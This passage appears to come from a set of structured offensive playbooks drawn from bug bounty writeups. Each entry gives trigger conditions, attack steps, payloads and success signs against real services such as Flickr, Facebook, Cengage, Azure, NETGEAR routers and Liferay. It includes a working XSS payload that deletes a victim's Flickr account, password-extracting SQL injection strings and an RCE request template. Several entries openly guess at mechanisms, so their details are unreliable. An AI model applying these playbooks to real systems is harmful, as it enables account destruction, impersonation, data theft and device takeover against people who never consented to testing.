Step 2: Identify API endpoints that return 404 Not Found.
Step 3: Use the Wayback Machine (archive.org) to check historical versions of the target URL for the 404 endpoint.
Step 4: If historical data is found, examine the archived response for sensitive information like credentials.
Step 5: Identify the path to the admin login panel (e.g., /signin).
Step 6: Attempt to log in to the admin panel using credentials found in archived API responses.
Step 7: If credentials from one subdomain's archived /api/v1/config work on the /signin path of another subdomain, check the same credentials against other environments (staging, dev).
Step 8: Use subdomain enumeration tools (gotator, regulator, dnsgen) to discover development and staging subdomains if not readily apparent.
attack_steps: Step 1: Access the target website and extract JavaScript files.
Step 2: Parse JavaScript files to identify API endpoints. Note any endpoints returning 404.
Step 3: Visit archive.org and search for historical snapshots of the target URL containing the 404 endpoint.
Step 4: Examine archived responses for leaked credentials (username/password).
Step 5: Identify the login path (e.g., /signin) on the target application.
Step 6: Attempt to log in to the /signin path using the discovered credentials.
Step 7: If successful on one subdomain, test the same credentials against the /signin paths of development and staging subdomains.
Step 8: If access is gained to an admin panel, explore its features and navigate to other connected panels or applications using the same authorization token.
payloads_or_patterns: Username/password pairs found in archived /api/v1/config responses.
tools_recommended: Burp Suite (for manual analysis and testing login forms)
Wayback Machine (archive.org)
JavaScript deobfuscator/parser
gotator
regulator
dnsgen
success_indicators: Successful login to the admin panel at /signin.
Access to internal applications or other admin panels via an 'App' button with the same authorization token.
Access to development and staging environments using production credentials.
failure_indicators: Credentials do not work for login.
No sensitive information found in archived responses.
404 endpoint does not exist in historical archives.
Response for the 404 endpoint is not informative.

playbooks.impact: Gained administrative access to production, development, and staging environments, potentially leading to data breaches, unauthorized modifications, or further system compromise.
playbooks.key_lesson: Always check historical archives (like the Wayback Machine) for endpoints that currently return 404 Not Found, as they may contain leaked credentials or other sensitive information.

meta.title: Flickr Stored XSS

trigger_conditions.when_to_apply: This vulnerability is applicable when the target allows user-controlled input in group names, and this input is reflected unsanitized on pages accessible to other users, particularly pages that can be rendered within an iframe.
prerequisites: Attacker has an authenticated Flickr account.
applicability_signals: Existence of a feature to create groups with user-defined names.
Discovery of old-style `.gne` pages via tools like `gau`.
User-provided group names are reflected on `.gne` pages.
skip_if: Input in group names is properly sanitized and does not lead to script execution.
The `.gne` pages do not render user-provided group names or are not accessible/renderable in an iframe.

recon_steps: Step 1: Use a tool like `gau` (gau https://github.com/lc/gau) to discover paths on flickr.com, paying attention to paths with `.gne` extensions.
Step 2: Attempt to create a Flickr group with a descriptive name and a simple XSS payload like `` to confirm if the input is reflected unsanitized.
Step 3: Navigate to the `/photos_user_map.gne` page (or similar `.gne` pages) with the attacker-created group to observe if the XSS payload triggers.
attack_steps: Step 1: Craft an HTML file with JavaScript that creates a hidden iframe pointing to the Flickr account deletion page (`https://www.flickr.com/account/delete`).
Step 2: Within the iframe's `onload` event, use JavaScript to find the CSRF token link (which contains an `h=` parameter).
Step 3: Simulate a click on the CSRF token link to navigate the iframe to the next step of the deletion process.
Step 4: After a short delay (to allow the page to load), simulate clicks on the 'confirm' checkbox and the 'Submit' button within the iframe to complete the account deletion.
payloads_or_patterns: <script> location.href="https://www.flickr.com/photos_user_map.gne?path=&nsid=14815413%40N21&mode=group&lang=en&tag=1#document.write(` <iframe style='display: none' id=ifr src='https://www.flickr.com/account/delete'> </iframe> `);ifr.onload = () => { hrefs = ifr.contentDocument.getElementsByTagName('a'); for(var i =0; i < hrefs.length; i++) { if(hrefs[i].href.match('h=')) { hrefs[i].click() } setTimeout(() => {ifr.contentDocument.getElementsByName('confirm')[0].click(); ifr.contentDocument.getElementsByName('Submit')[0].click()} ,500)} }"</script>
tools_recommended: gau: for discovering paths.
Burp Suite: for intercepting and analyzing requests/responses.
Browser Developer Tools: for debugging JavaScript and observing DOM manipulation.
success_indicators: The victim's Flickr account is successfully deleted.
The XSS payload `alert(1)` is executed when visiting the victim's profile or a page displaying the group name.
failure_indicators: The XSS payload does not execute, indicating input sanitization or a lack of reflection.
The account deletion PoC fails to trigger due to X-Frame-Options or changes in the account deletion flow, suggesting the need to re-evaluate the exploit path or look for alternative impacts.

playbooks.impact: Attacker can cause any authenticated user to delete their own Flickr account by tricking them into visiting a specially crafted page or URL that renders the vulnerable component containing the stored XSS payload, leading to account compromise and data loss.
playbooks.key_lesson: Always test user-controlled input in group names or similar features on older or legacy endpoints (.gne files in this case) for stored XSS, and attempt to exploit it to perform sensitive actions like account deletion if possible, considering browser security features like X-Frame-Options.

meta.title: ACSESSED: Cross-tenant network bypass in Azure Cognitive Search

affected_components: Networking configuration, specifically the 'Allow access from Portal' feature
tech_stack_fingerprints: Azure portal UI for Cognitive Search networking options

trigger_conditions.when_to_apply: When an Azure Cognitive Search instance has the 'Allow access from Portal' feature enabled, and the attacker has some information about a target ACS instance (e.g., its name or endpoint).
prerequisites: Attacker has knowledge of a target Azure Cognitive Search instance name or endpoint.
The target Azure Cognitive Search instance has the 'Allow access from Portal' networking feature enabled.
applicability_signals: An Azure Cognitive Search instance is deployed.
The Azure portal UI for the Cognitive Search instance shows a 'Allow access from Portal' networking option.
Investigation of the Cognitive Search API reveals the `networkRuleSet.bypass` property is set to 'AzurePortal'.
skip_if: The 'Allow access from Portal' feature is not enabled on the target Azure Cognitive Search instance.
The `networkRuleSet.bypass` property is not set to 'AzurePortal' or is set to 'None'.

recon_steps: Step 1: Identify Azure Cognitive Search instances. This might involve searching Azure resource graphs or looking for common ACS naming conventions.
Step 2: For identified ACS instances, check their networking configuration in the Azure portal or via Azure CLI/API. Look for the 'Allow access from Portal' option.
Step 3: If 'Allow access from Portal' is enabled, examine the `networkRuleSet.bypass` property of the instance's network ruleset. Confirm it is set to 'AzurePortal'.
attack_steps: Step 1: Obtain the endpoint of the target Azure Cognitive Search instance (e.g., `<acs-name>.search.windows.net`).

Step 2: Craft requests to the ACS endpoint, mimicking requests that would originate from the Azure portal. The exact mechanism for this bypass isn't fully detailed, but the writeup implies direct requests to the ACS data plane can bypass network restrictions when 'AzurePortal' bypass is enabled.

Step 3: Attempt to query data from the ACS instance. The writeup doesn't specify exact query parameters but implies that if the bypass is effective, queries will succeed even if the instance is network-isolated.

Step 4: If initial queries fail, further investigation into how 'AzurePortal' bypasses network rules would be needed. This could involve analyzing traffic from the Azure portal when accessing an ACS instance.
payloads_or_patterns:
GET /indexes?api-version=2020-06-30 HTTP/1.1
Host: <TARGET_ACS_ENDPOINT>
Accept: application/json
api-key: <ANY_VALID_API_KEY_OR_SESSION_TOKEN>
tools_recommended: Azure CLI: To inspect resource configurations and network rulesets.
Burp Suite: To intercept and modify requests to the ACS endpoint.
Custom scripts (Python/Bash): To automate the enumeration of ACS instances and testing of network bypass.
success_indicators: Successful retrieval of data from the Azure Cognitive Search instance, even if it's supposed to be network-isolated.
Receiving a valid response from the ACS data plane (e.g., a list of indexes or search results) when making requests from an unauthorized network location.
failure_indicators: Receiving network-level errors (e.g., connection refused, timeout) when attempting to access the ACS endpoint.
Receiving authorization errors (e.g., 401 Unauthorized, 403 Forbidden) if API key or session token is invalid, but not a network-level block.
If the `networkRuleSet.bypass` property is not 'AzurePortal', the bypass will not work.

playbooks.impact: An attacker can bypass network segmentation and access sensitive data stored in network-isolated Azure Cognitive Search instances, potentially leading to data exfiltration and cross-tenant data leakage.
playbooks.key_lesson: When investigating Azure services, always examine networking configurations, especially 'bypass' or 'allowlist' features, as they can inadvertently create unintended access paths across tenants or network perimeters.

meta.title: Puckungfu: A NETGEAR WAN Command Injection

tech_stack_fingerprints: specific firmware versions (implied by the vulnerability)

trigger_conditions.when_to_apply: When a NETGEAR router is accessible from the WAN interface and is running a vulnerable firmware version.
prerequisites: The target is a NETGEAR router with a WAN interface exposed to the internet.
The router is running a vulnerable firmware version (specific versions mentioned in the writeup as vulnerable are likely candidates, e.g., prior to V1.0.1.62 for the RAX40).
applicability_signals: Observing the device type and version during reconnaissance.
Identifying HTTP requests to the router's WAN IP address.
skip_if: The router's WAN interface is not accessible.
The router is running a patched firmware version.

recon_steps: Step 1: Identify the target device as a NETGEAR router, preferably by observing its public IP address and associated network services.

Step 2: Attempt to determine the firmware version of the NETGEAR router. This might be possible through banner grabbing, specific HTTP responses, or by leveraging known default credentials for NETGEAR devices if an administrative interface is exposed (though not required for this vulnerability).
attack_steps: Step 1: Send a specially crafted HTTP POST request to the router's WAN IP address targeting a specific endpoint that handles user input for WAN settings or diagnostics.

Step 2: The request body should contain a payload that exploits the command injection vulnerability. The specific payload involves injecting shell commands into a parameter that is processed unsafely.

Step 3: Observe the response to determine if the injected command was executed. For example, attempting to echo a unique string and checking if it appears in the response, or checking for outbound network connections if a reverse shell payload is used.
payloads_or_patterns:
POST /cgi-bin/routeradv.cgi HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/x-www-form-urlencoded

CMD=<INJECTED_SHELL_COMMAND>
tools_recommended: curl: For crafting and sending HTTP requests manually.
Burp Suite: To intercept, modify, and send HTTP requests, and to analyze responses.
Nmap: For network scanning and identifying open ports and services on the target IP.
success_indicators: The router executing arbitrary shell commands, verifiable by observing the command's output in the HTTP response.
Successful establishment of a reverse shell connection to an attacker-controlled server.
Observable changes in router configuration or behavior attributable to the injected command.
failure_indicators: HTTP 400 Bad Request or similar errors, indicating the payload is malformed or not reaching the intended processing logic.
No execution of the injected command and no observable output or side effects.
WAF blocking the request if an external WAF is present.

playbooks.impact: Remote attackers can execute arbitrary commands on the affected NETGEAR router with root privileges. This can lead to complete compromise of the device, including data exfiltration, pivoting to the internal network, or using the router for malicious activities like DDoS attacks or cryptocurrency mining.
playbooks.key_lesson: Always validate and sanitize all user-supplied input, especially when it is used to construct system commands, and avoid directly executing user input as commands on the server.

meta.title: Multiple authenticated blind SQL Injections in Sage XRT Business Exchange application

affected_components: User management, payment processing, and other backend services
tech_stack_fingerprints: PDF metadata and internal structures (inferred from writeup content)

trigger_conditions.when_to_apply: When an authenticated user can interact with parameters that are likely to be used in database queries and these parameters are not properly sanitized.
prerequisites: Attacker must have an authenticated session with any user role.
applicability_signals: API endpoints that accept user-controllable input, especially for ID fields, search queries, or any data submission.
Application exhibits slow responses or specific error messages when crafted input is provided, indicating potential database interaction.
skip_if: Application returns consistent 4xx or 5xx errors for all requests, regardless of input.
All database-related parameters are correctly parameterized or sanitized, preventing injection attempts.

recon_steps: Step 1: Authenticate to the Sage XRT Business Exchange application with a valid user account.

Step 2: Identify API endpoints that handle user data or perform operations that likely interact with a database, paying attention to parameters containing IDs, search terms, or other user-supplied data.

Step 3: Intercept requests using a proxy (e.g., Burp Suite) and analyze the responses for patterns that might indicate database queries (e.g., response timing, specific error messages, or data retrieval).
attack_steps: Step 1: For identified API endpoints, send requests with modified parameters to test for SQL injection vulnerabilities. Start with simple boolean-based injections (e.g., appending ' AND 1=1' or ' AND 1=2').

Step 2: If boolean-based injections show differential responses (e.g., different success/failure messages or response lengths), proceed to time-based blind SQL injection by appending commands that cause delays (e.g., ' AND pg_sleep(5)').

Step 3: If time-based injections are successful, systematically extract data by crafting specific SELECT queries, leveraging the timing difference as the indicator of correctness. For example, to extract the first character of a username: ' AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a'' and observe the time delay. Iterate through characters and positions.
Step 4: Repeat the process for other sensitive data fields and tables within the application.
payloads_or_patterns: ' AND SUBSTRING((SELECT password FROM users WHERE username = '<target_username>'), 1, 1) = '<char>'
tools_recommended: Burp Suite (Proxy, Repeater, Intruder)
sqlmap (for automated detection and exploitation)
success_indicators: Differential response times (longer delays when injected conditions are true).
Successful retrieval of sensitive data (e.g., usernames, emails, hashed passwords) via crafted SELECT statements.
Application returning specific, predictable error messages or data structures that can be correlated with the injected payloads.
failure_indicators: No discernible difference in response times or content for injected payloads, suggesting robust input sanitization or a lack of direct SQL injection vulnerability.

Consistent generic error messages or immediate timeouts, potentially indicating a Web Application Firewall (WAF) or other security measures blocking the attempts. Pivot to fuzzing for other vulnerabilities or alternative injection points.

playbooks.impact: Attacker can extract sensitive information from the database, including user credentials, personal data, financial information, and potentially perform unauthorized actions on behalf of other users.
playbooks.key_lesson: Always test authenticated endpoints for blind SQL injection vulnerabilities by systematically fuzzing parameters with boolean-based and time-based payloads to infer database structure and extract sensitive data.

meta.title: Passwordless Persistence and Privilege Escalation in Azure

tech_stack_fingerprints: Mentions of Azure AD, SpecterOps platform features related to identity attack path management in Azure

trigger_conditions.when_to_apply: When an attacker has initial access to an Azure environment and seeks to establish persistent access or escalate privileges without relying on traditional credentials.
prerequisites: Initial access to an Azure environment.
Understanding of Azure identity and access management concepts.
applicability_signals: Target environment is Microsoft Azure.
Investigating methods for maintaining access after initial compromise.
Exploring privilege escalation vectors beyond traditional credential theft.
skip_if: Target environment is not Azure.
The primary goal is not persistence or privilege escalation.

recon_steps: Step 1: Analyze the writeup for specific Azure identity features or misconfigurations that enable passwordless persistence or privilege escalation.
Step 2: Identify Azure AD objects (users, service principals, managed identities) and their associated permissions and roles.
attack_steps: Step 1: Research and identify Azure-specific techniques for establishing passwordless persistence, such as leveraging service principals with long-lived credentials or improper role assignments.
Step 2: Investigate Azure AD features that could be abused for privilege escalation, e.g., insecurely configured application registrations, delegation of administrative roles.
Step 3: If specific attack vectors are detailed, enumerate Azure resources and attempt to apply the described techniques to gain or maintain access.
tools_recommended: Azure CLI
Azure PowerShell
SpecterOps BloodHound Enterprise (for mapping attack paths)
Managed identity exploitation tools (if applicable)
success_indicators: Successful authentication to Azure resources without traditional passwords.
Ability to perform administrative actions on Azure resources that were not previously accessible.
Creation of new persistent access mechanisms (e.g., new service principals, modified role assignments).
failure_indicators: Inability to identify or exploit passwordless persistence mechanisms.
Standard Azure security controls blocking attempts to escalate privileges.
Error messages indicating insufficient permissions or invalid configurations.

playbooks.impact: Attacker can maintain persistent access to Azure resources even if initial credentials are changed. Attacker can escalate privileges to gain control over sensitive Azure resources, including subscriptions and tenant-wide administrative roles.
playbooks.key_lesson: Investigate Azure AD identity configurations for misconfigurations that allow for passwordless persistence and privilege escalation, focusing on service principals, application registrations, and role assignments.

meta.title: Delete any Video or Reel on Facebook

affected_components: Meta Business Suite video upload feature (cropping)

trigger_conditions.when_to_apply: When an authenticated user can upload videos and has access to the Meta Business Suite for cropping/trimming functionality.
prerequisites: Attacker must have an authenticated Facebook account.
applicability_signals: Presence of video upload and editing features (crop, trim) in Meta Business Suite.
API requests related to video editing that contain video IDs.
skip_if: The video editing endpoints do not accept or process video IDs.
All video editing operations require strict ownership checks that cannot be bypassed.

recon_steps: Step 1: Access Meta Business Suite and navigate to the video upload feature.
Step 2: Observe the network requests made during video upload, cropping, and trimming operations using a proxy like Burp Suite.
Step 3: Identify API endpoints and parameters involved in video editing, particularly looking for `video_id` or similar identifiers.
attack_steps: Step 1: Upload a video from a victim's account (or a test victim account).
Step 2: Obtain the `video_id` of the victim's uploaded video.
Step 3: Obtain the attacker's Facebook Android app access token.
Step 4: Craft a GraphQL POST request to the identified video editing endpoint, using the attacker's access token and manipulating the `video_id` to point to the victim's video.
Step 5: Modify the cropping parameters in the request to a minimal size (e.g., 1x1 pixel) or attempt to simulate a deletion by trimming to a very short duration.
Step 6: Send the crafted request and monitor the response and the victim's account for signs of video deletion.
tools_recommended: Burp Suite: Intercepting and modifying HTTP requests.
Facebook Android App: To obtain session tokens.
success_indicators: The victim's video is no longer visible on their profile or in search results.
A successful deletion response from the API (e.g., 200 OK with a confirmation message).
The video appears to be distorted or deleted in the Meta Business Suite interface.
failure_indicators: API returns an error indicating invalid ownership or insufficient permissions (e.g., 403 Forbidden).
The video remains visible after sending the request.
The cropping/trimming operation fails to complete or has no effect.

playbooks.impact: An attacker can delete any video, live video, or reel uploaded by any Facebook user by manipulating video IDs in the video editing API requests. This can lead to content removal, disruption, and potential reputational damage to individuals or organizations.
playbooks.key_lesson: Always thoroughly test video/media editing functionalities by attempting to manipulate the content or metadata of other users' uploaded assets, paying close attention to the `video_id` parameter and associated API requests.

meta.title: Cisco BroadWorks CommPilot Application Software Unauthenticated Server-Side Request Forgery (CVE-2022-20951)

trigger_conditions.when_to_apply: When the Cisco BroadWorks CommPilot Application Software is deployed and accessible via HTTP or HTTPS, and an attacker can interact with the application's web interface.
prerequisites: Target system is running Cisco BroadWorks CommPilot Application Software.
applicability_signals: The presence of a /Login endpoint that, when accessed, provides a JSESSIONID cookie.
The target URL parameter is present in requests to certain endpoints.
skip_if: The /Login endpoint redirects to an authentication page instead of providing a session cookie.
The target parameter is not accepted or is heavily validated against allowed domains.

recon_steps: Access the root of the target URL to identify the application and potential entry points.
Attempt to access the '/Login' endpoint to determine if it provides a session cookie without requiring credentials.
attack_steps: Step 1: Navigate to the /Login endpoint (e.g., GET <TARGET_URL>/Login) to obtain a valid JSESSIONID cookie.

Step 2: Send a request to an endpoint that accepts a 'target' parameter, including the JSESSIONID obtained in Step 1. Craft the 'target' parameter with a URL to an internal resource or a sensitive external service (e.g., GET <TARGET_URL>/some_endpoint?target=http://internal-server/admin).
Step 3: Analyze the response for content from the target URL, indicating successful SSRF.
tools_recommended: Burp Suite: To intercept and modify requests, specifically to capture the JSESSIONID and craft the 'target' parameter.
curl: For scripting the request sequence.
success_indicators: The HTTP response contains content from the specified internal or external target URL.
HTTP status codes other than 400 (Bad Request) or redirects to login pages, indicating the request was processed.
failure_indicators: Receiving a 400 Bad Request or a redirect to the login page, even with a valid session cookie. This might indicate the 'target' parameter is not handled by the HttpProxyServlet, or the session is not considered valid by the server for this action. Pivot by trying to understand what endpoints accept the 'target' parameter.

Receiving a 403 Forbidden or similar error when trying to access internal resources. This might suggest that while SSRF is possible, access control on the internal resource itself is preventing exploitation.

playbooks.impact: An unauthenticated attacker can force the Cisco BroadWorks CommPilot Application Software to make requests to arbitrary internal or external network resources. This can lead to the disclosure of sensitive information, access to internal services, or further exploitation of other systems within the target's network.
playbooks.key_lesson: Always validate and sanitize user-supplied URLs in proxy or forwarding functionalities. Ensure authentication checks are robust and not bypassed by obtaining session tokens through unauthenticated endpoints.

meta.title: A Technical Analysis of CVE-2022-22583 and CVE-2022-32800

trigger_conditions.when_to_apply: When an attacker has low-privilege access to a macOS system and can leverage specific vulnerabilities to bypass System Integrity Protection (SIP) for privilege escalation.
prerequisites: Attacker has low-privilege user access on the target macOS machine.
applicability_signals: Target is running a vulnerable version of macOS.
Knowledge of specific CVEs (CVE-2022-22583, CVE-2022-32800) that impact SIP.
skip_if: Target is running a patched version of macOS.
Attacker does not have any user access to the target system.

recon_steps: Step 1: Determine the macOS version running on the target system.
Step 2: Identify if SIP is enabled and its current protection level (e.g., using `csrutil status`).
attack_steps: Step 1: Exploit CVE-2022-22583 to gain the ability to write to sensitive system directories that are normally protected by SIP.
Step 2: Leverage the ability to write to these directories to inject malicious code or modify existing system components.

Step 3: Exploit CVE-2022-32800 (or a similar mechanism discovered through research) to achieve privilege escalation by tricking a privileged process into executing the injected code or utilizing the modified components.
tools_recommended: Custom exploit code targeting CVE-2022-22583 and CVE-2022-32800.
macOS terminal for executing commands.
success_indicators: Execution of code with elevated privileges (e.g., root).
Ability to modify or write to protected system files.
System logs indicating unexpected process behavior or privilege changes.
failure_indicators: Exploits fail to execute or return errors.
SIP remains intact and protections are not bypassed.
System alerts or crash.

playbooks.impact: Attacker can achieve arbitrary code execution with root privileges on the target macOS system, leading to complete system compromise.
playbooks.key_lesson: When targeting macOS, always investigate potential vulnerabilities that bypass System Integrity Protection (SIP) as they often lead to powerful privilege escalation opportunities.

meta.title: Diving into an Old Exploit Chain and Discovering 3 new SIP-Bypass Vulnerabilities

trigger_conditions.when_to_apply: When a specific vulnerability is discovered that allows for a bypass of macOS's System Integrity Protection (SIP).
prerequisites: A vulnerable version of macOS is running.
An initial low-privilege execution vector is available.
applicability_signals: Knowledge of a specific CVE or vulnerability related to SIP bypass.
skip_if: The target system is running a patched version of macOS where the specific SIP bypass vulnerability has been fixed.

recon_steps: Step 1: Identify the target macOS version and check for known vulnerabilities related to SIP bypass.
Step 2: Verify if the specific vulnerability discussed in the writeup is present on the target system.
attack_steps: Step 1: Leverage the identified SIP bypass vulnerability to gain elevated privileges.
Step 2: Execute malicious code or modify protected system files as demonstrated in the research (specifics depend on the vulnerability).
Step 3: Confirm successful bypass and unauthorized access to protected areas.
tools_recommended: Metasploit (for exploit modules, if available)
Custom exploit scripts tailored to the specific vulnerability
success_indicators: Ability to write to or modify files within SIP-protected directories (e.g., /System, /usr, /bin, /sbin).
Execution of commands with root privileges from a non-root context.
Successful exploitation of the specific CVEs mentioned (CVE-2023-32354, CVE-2023-32376, CVE-2023-38606).
failure_indicators: Write operations to SIP-protected directories are denied with 'Operation not permitted' errors.
Exploit execution results in a crash or unexpected behavior without achieving elevated privileges.

playbooks.impact: Gaining root-level privileges on a macOS system, allowing for complete compromise of the machine, data theft, installation of persistent backdoors, or further lateral movement within a network.
playbooks.key_lesson: Always investigate known vulnerability chains and research detailed writeups for macOS SIP bypass techniques, as they can reveal persistent or recurring flaws exploitable on vulnerable versions.

meta.title: From PostAuth RCE to PreAuth RCE on Liferay Portal

trigger_conditions.when_to_apply: When a Liferay Portal instance is detected and the version is less than or equal to 7.1.0, and the /c/portal/portlet_url endpoint is accessible.
prerequisites: Target Liferay Portal version is <= 7.1.0
applicability_signals: The endpoint POST /c/portal/portlet_url exists and accepts Content-Type: application/x-www-form-urlencoded.
The application utilizes the JSONFactoryUtil.deserialize function with user-controlled input.
skip_if: The /c/portal/portlet_url endpoint is not found or returns a non-200 status code.
Liferay Portal version is known to be patched.

recon_steps: Send a GET request to /c/portal/portlet_url on the target host.
Observe the response status code. A 200 status code indicates potential vulnerability.
attack_steps: Send a POST request to /c/portal/portlet_url with the following headers:
Host: <TARGET_URL>
User-Agent: Mozilla/5.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://<TARGET_URL>
Referer: http://<TARGET_URL>
Connection: close
Include a `parameterMap` parameter in the POST body containing a serialized JSON payload designed to trigger the deserialization vulnerability in the `org.jabsorb.JSONSerializer` library.
Craft the JSON payload to achieve remote code execution.
payloads_or_patterns:
POST /c/portal/portlet_url HTTP/1.1
Host: <TARGET_URL>
User-Agent: Mozilla/5.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://<TARGET_URL>
Referer: http://<TARGET_URL>
Connection: close

parameterMap={"json_payload_here"}
tools_recommended: Burp Suite: To craft and send the POST request with the malicious JSON payload.
ysoserial: To generate Java deserialization payloads.
success_indicators: Receiving a successful response (e.g., 200 OK) that indicates code execution, such as a shell connection or a file creation on the server.
Observing the effects of the executed command on the target system.
failure_indicators: Receiving an error message indicating invalid JSON or a deserialization error.
Receiving a 400 or 500 series error code without clear indication of successful execution.
No observable effect of the command on the target system; pivot to analyzing different deserialization gadgets or payload variations.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the Liferay Portal server, allowing an attacker to gain complete control over the system.
playbooks.key_lesson: Always test endpoints that process JSON data for deserialization vulnerabilities, especially if they are accessible without authentication and the application version is known to be vulnerable. Focus on the `JSONFactoryUtil.deserialize` function in Liferay Portal and its underlying libraries.

meta.title: How I found my first XSS on a Bug Bounty Program

trigger_conditions.when_to_apply: When a web application feature allows users to input text that is then processed or displayed, particularly if it involves translation or text manipulation.
prerequisites: Attacker must have an authenticated user account on the target application.
applicability_signals: Presence of a text input field within a feature like a translation tool.
Observing the application's response to user input via Burp Suite.
skip_if: If all inputs are strictly sanitized and no dynamic rendering or echoing of untrusted input occurs.

recon_steps: Step 1: Use Google Dorking to find bug bounty programs related to 'Cryptocurrency Exchange' and 'Bug bounty'.
Step 2: Check the scope of the identified bug bounty program. If the main domain is in scope, proceed to explore its features.
Step 3: Capture all requests to the target application using Burp Suite, paying close attention to newly implemented features.
attack_steps: Step 1: Identify a feature that takes user input, such as a translation tool.
Step 2: Submit a basic XSS payload like '>img src=x onerror=alert(1)>' into the input field and observe the source code for sanitization.
Step 3: If sanitization is present but not perfect, send the request to Burp Suite's Repeater to experiment with XSS bypass techniques.
Step 4: If Repeater yields no results, send the request to Burp Suite's Intruder.
Step 5: Configure Intruder to fuzz the input parameter with a comprehensive list of XSS payloads.
Step 6: Analyze the Intruder results by sorting by response length to identify potentially larger and more complex payloads that might have executed.
tools_recommended: Burp Suite (Repeater and Intruder)
Google Dorking
success_indicators: The specific XSS polyglot payload from the writeup successfully fires.
Observing the response to confirm execution of the XSS payload, as indicated by the 'show response' screenshot.
failure_indicators: Input is strictly sanitized, and no rendered output reflects the injected payload.
Attempts with common XSS bypasses in Repeater do not result in execution.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, sensitive data exfiltration, or performing actions on behalf of the user.
playbooks.key_lesson: When input is echoed and processed by a web application, especially in features like translation or text manipulation, systematically test for XSS using fuzzing tools like Burp Intruder with diverse payload lists.

meta.title: Cengage LTI Session Management Leakage

tech_stack_fingerprints: Uses LTI integrations with LMS platforms

trigger_conditions.when_to_apply: This playbook is applicable when an attacker can intercept or modify LTI launch requests and the target application fails to properly validate the LTI signature.
prerequisites: Attacker must be an authenticated user within the Cengage LTI ecosystem.
Attacker needs to intercept HTTP requests for LTI launches.
applicability_signals: Observing the `/rest/launchBasicLTI` endpoint.
The presence of LTI parameters in POST requests, including a `signatureVerified` parameter.
skip_if: The target application returns a 200 OK status for all LTI launches with a valid signature and does not present a `signatureVerified` parameter that can be manipulated.

recon_steps: Step 1: Authenticate as a regular user in Cengage.
Step 2: Navigate to a section that triggers an LTI launch (e.g., accessing an integrated e-textbook or homework tool).
attack_steps: Step 1: Intercept the POST request to `https://gateway.cengage.com/rest/launchBasicLTI` that is generated during the LTI launch.
Step 2: Locate the `signatureVerified` parameter within the request body.
Step 3: Modify the value of `signatureVerified` from `false` to `true`.
Step 4: Forward the modified request to the server.
payloads_or_patterns: Intercepted POST request to `https://gateway.cengage.com/rest/launchBasicLTI` with `signatureVerified=true` instead of `false`.
tools_recommended: Burp Suite: Use the Intercept and Repeater functionalities to capture, modify, and resend requests.
success_indicators: The server accepts the modified request and grants the attacker session access as the targeted user.
The attacker gains access to resources or data belonging to another user.
failure_indicators: The server returns an error or a 4xx/5xx status code indicating the request is still invalid despite the `signatureVerified` modification.
The attacker is not granted access to other users' data or functionality.

playbooks.impact: An authenticated attacker can impersonate other users, including students, instructors, or administrators, allowing them to access and potentially modify sensitive information or perform actions on behalf of the victim.
playbooks.key_lesson: Always validate cryptographic signatures on all incoming requests, especially those related to authentication or authorization flows like LTI launches.
